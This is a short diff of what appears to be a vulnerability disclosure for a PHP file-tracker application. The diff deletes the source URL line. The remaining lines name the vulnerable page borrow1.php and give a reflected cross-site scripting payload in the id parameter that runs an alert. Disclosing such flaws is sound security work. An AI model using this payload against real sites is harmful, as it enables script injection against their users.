@@ -2,8 +2,6 @@
 
 BUG_Author: godownio
 
-Website source address:https://www.sourcecodester.com/php/11510/file-tracker-manager.html
-
 Vulnerability File: /file_manager/normal/borrow1.php
 
 Payload1:/file_manager/normal/borrow1.php?id=1"><script>alert(1111)</script>
